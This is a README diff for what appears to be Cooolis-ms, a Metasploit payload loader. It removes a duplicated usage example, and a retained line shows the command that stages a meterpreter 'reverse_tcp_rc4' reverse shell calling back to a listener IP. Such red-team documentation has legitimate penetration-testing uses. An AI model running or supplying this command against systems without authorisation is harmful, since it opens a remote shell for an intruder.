@@ -90,12 +90,6 @@ Q&A : [是否支持RC4加密的Payload?](https://github.com/Rvn0xsy/Cooolis-ms/i
 Cooolis-ms.exe -p windows/meterpreter/reverse_tcp_rc4 -s LHOST=10.20.56.41,LPORT=8876,RC4PASSWORD=rc4_password,Format=dll -H 10.20.56.41 -P 8899
 ```
 
-* windows/meterpreter/reverse_tcp_rc4：
-
-```
-Cooolis-ms.exe -p windows/meterpreter/reverse_tcp_rc4 -s LHOST=10.20.56.41,LPORT=8876,RC4PASSWORD=rc4_password,Format=dll -H 10.20.56.41 -P 8899
-```
-
 * windows/meterpreter_reverse_https
 
 ```
